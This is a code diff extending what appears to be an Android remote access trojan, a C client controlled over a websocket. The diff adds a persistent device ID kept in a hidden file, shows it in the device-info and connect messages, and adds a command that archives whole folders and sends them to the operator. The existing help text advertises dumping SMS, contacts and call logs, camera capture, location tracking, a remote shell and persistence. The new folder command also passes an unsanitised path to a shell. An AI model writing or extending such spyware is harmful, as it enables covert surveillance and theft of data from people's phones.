@@ -49,6 +49,7 @@ char g_server_path[256] = "/";
 int g_sock = -1;
 char g_hostname[256];
 char g_username[256];
+char g_client_id[64];  // Unique client identifier (persisted)
 char g_current_dir[4096];
 volatile int g_connected = 0;
 volatile int g_should_exit = 0;
@@ -526,6 +527,52 @@ void send_websocket_ping() {
     send(g_sock, ping_frame, 6, 0);
 }
 
+// Generate or load unique client ID (persisted in hidden file)
+void init_client_id() {
+    char id_file[256] = "/data/local/tmp/.client_id";
+    
+    // Try to read existing ID
+    FILE* f = fopen(id_file, "r");
+    if (f) {
+        if (fgets(g_client_id, 32, f)) {
+            g_client_id[strcspn(g_client_id, "\n")] = 0;
+            if (strlen(g_client_id) >= 16) {
+                fclose(f);
+                return;
+            }
+        }
+        fclose(f);
+    }
+    
+    // Generate new unique ID based on Android ID + random
+    char android_id[64] = "";
+    FILE* fp = popen("settings get secure android_id 2>/dev/null", "r");
+    if (fp) {
+        fgets(android_id, sizeof(android_id), fp);
+        android_id[strcspn(android_id, "\n")] = 0;
+        pclose(fp);
+    }
+    
+    // Hash android_id to get a stable component
+    unsigned long hash = 5381;
+    for (int i = 0; android_id[i]; i++) {
+        hash = ((hash << 5) + hash) + android_id[i];
+    }
+    
+    snprintf(g_client_id, sizeof(g_client_id), "%08lX%08lX%08lX%04X",
+             hash,
+             (unsigned long)time(NULL),
+             (unsigned long)getpid(),
+             (unsigned int)(rand() & 0xFFFF));
+    
+    // Save for persistence
+    f = fopen(id_file, "w");
+    if (f) {
+        fprintf(f, "%s\n", g_client_id);
+        fclose(f);
+    }
+}
+
 void* ping_thread_func(void* arg) {
     while (g_ping_running && g_connected) {
         sleep(PING_INTERVAL);
@@ -945,6 +992,7 @@ void send_device_info() {
         "\n=== Android Device Information ===\n"
         "Model: %s %s (%s)\n"
         "Android Version: %s (SDK %s)\n"
+        "ClientID: %s\n"
         "Serial: %s\n"
         "IMEI: %s\n"
         "Battery: %s\n"
@@ -955,6 +1003,7 @@ void send_device_info() {
         "==================================\n\n",
         brand, model, device,
         android_ver, sdk,
+        g_client_id,
         strlen(serial) > 0 ? serial : "Unknown",
         strlen(imei) > 0 ? imei : "Unknown",
         battery,
@@ -1104,6 +1153,53 @@ void download_file(const char* filename) {
     char msg[512];
     snprintf(msg, sizeof(msg), "\n[+] File sent: %s (%ld bytes)\n", basename, file_size);
     send_websocket_data(msg, strlen(msg));
+}
+
+// ============== FOLDER DOWNLOAD ==============
+void download_folder(const char* foldername) {
+    // Clean path
+    char clean_name[4096];
+    const char* start = foldername;
+    while (*start == ' ' || *start == '\t') start++;
+    strncpy(clean_name, start, sizeof(clean_name) - 1);
+    clean_name[sizeof(clean_name) - 1] = '\0';
+    int len = strlen(clean_name);
+    while (len > 0 && (clean_name[len-1] == ' ' || clean_name[len-1] == '\t' ||
+                       clean_name[len-1] == '/')) {
+        clean_name[--len] = '\0';
+    }
+    
+    // Check if directory exists
+    struct stat st;
+    if (stat(clean_name, &st) != 0 || !S_ISDIR(st.st_mode)) {
+        send_websocket_data("[!] Folder not found\n", 21);
+        return;
+    }
+    
+    send_websocket_data("[*] Compressing folder...\n", 26);
+    
+    // Create temp tar.gz file
+    char temp_zip[256];
+    snprintf(temp_zip, sizeof(temp_zip), "/data/local/tmp/.folder_%d.tar.gz", getpid());
+    
+    char cmd[4096];
+    snprintf(cmd, sizeof(cmd), "tar -czf '%s' -C '%s' . 2>/dev/null", temp_zip, clean_name);
+    int ret = system(cmd);
+    
+    if (ret != 0 || access(temp_zip, R_OK) != 0) {
+        // Try without compression (busybox tar might not have gzip)
+        snprintf(temp_zip, sizeof(temp_zip), "/data/local/tmp/.folder_%d.tar", getpid());
+        snprintf(cmd, sizeof(cmd), "tar -cf '%s' -C '%s' . 2>/dev/null", temp_zip, clean_name);
+        ret = system(cmd);
+        
+        if (ret != 0 || access(temp_zip, R_OK) != 0) {
+            send_websocket_data("[!] Failed to compress folder\n", 30);
+            return;
+        }
+    }
+    
+    download_file(temp_zip);
+    unlink(temp_zip);
 }
 
 // ============== COMMAND EXECUTION ==============
@@ -1343,6 +1439,10 @@ void handle_command(const char* cmd) {
     else if (strncmp(clean_cmd, "download ", 9) == 0) {
         download_file(clean_cmd + 9);
     }
+    else if (strncmp(clean_cmd, "downloadfolder ", 15) == 0 || strncmp(clean_cmd, "dldir ", 6) == 0) {
+        char* path = (strncmp(clean_cmd, "downloadfolder ", 15) == 0) ? (char*)clean_cmd + 15 : (char*)clean_cmd + 6;
+        download_folder(path);
+    }
     else if (strncmp(clean_cmd, "cmd ", 4) == 0) {
         execute_command(clean_cmd + 4);
     }
@@ -1410,27 +1510,28 @@ void handle_command(const char* cmd) {
     else if (strcmp(clean_cmd, "help") == 0) {
         char* help = 
             "\nAvailable commands (Android):\n"
-            "  screenshot       - Take screenshot (needs shell/root)\n"
-            "  listcam          - List available cameras\n"
-            "  selectcam <n>    - Select camera (0=back, 1=front)\n"
-            "  camshot          - Take camera photo\n"
-            "  shell            - Interactive shell\n"
-            "  ps               - List processes\n"
-            "  download <file>  - Download file from device\n"
-            "  cmd <command>    - Execute single command\n"
-            "  cd <path>        - Change directory\n"
-            "  pwd              - Current directory\n"
-            "  sysinfo          - Device information\n"
-            "  apps             - List installed apps\n"
-            "  wifi             - WiFi information\n"
-            "  sms              - Dump SMS messages (root)\n"
-            "  contacts         - Dump contacts (root)\n"
-            "  calllog          - Dump call history (root)\n"
-            "  location         - Get device location (root)\n"
-            "  persist          - Install persistence\n"
-            "  unpersist        - Remove persistence\n"
-            "  exit             - Exit session (client reconnects)\n"
-            "  help             - This help\n\n";
+            "  screenshot         - Take screenshot (needs shell/root)\n"
+            "  listcam            - List available cameras\n"
+            "  selectcam <n>      - Select camera (0=back, 1=front)\n"
+            "  camshot            - Take camera photo\n"
+            "  shell              - Interactive shell\n"
+            "  ps                 - List processes\n"
+            "  download <file>    - Download file from device\n"
+            "  downloadfolder <p> - Download entire folder as tar.gz\n"
+            "  cmd <command>      - Execute single command\n"
+            "  cd <path>          - Change directory\n"
+            "  pwd                - Current directory\n"
+            "  sysinfo            - Device information (shows ClientID)\n"
+            "  apps               - List installed apps\n"
+            "  wifi               - WiFi information\n"
+            "  sms                - Dump SMS messages (root)\n"
+            "  contacts           - Dump contacts (root)\n"
+            "  calllog            - Dump call history (root)\n"
+            "  location           - Get device location (root)\n"
+            "  persist            - Install persistence\n"
+            "  unpersist          - Remove persistence\n"
+            "  exit               - Exit session (client reconnects)\n"
+            "  help               - This help\n\n";
         send_websocket_data(help, strlen(help));
     }
     else {
@@ -1458,9 +1559,10 @@ void handle_session() {
     snprintf(connect_msg, sizeof(connect_msg),
         "\n[+] Android Client Connected\n"
         "[+] Device: %s | Android %s\n"
+        "[+] ClientID: %s\n"
         "[+] Rooted: %s\n"
         "[+] Directory: %s\n\n",
-        model, android_ver,
+        model, android_ver, g_client_id,
         g_is_rooted ? "Yes" : "No",
         g_current_dir
     );
@@ -1558,6 +1660,9 @@ int main(int argc, char* argv[]) {
     
     g_session_id = getpid() ^ time(NULL);
     g_is_rooted = check_root();
+    
+    // Initialize unique client ID
+    init_client_id();
     
     // Main connection loop
     while (1) {
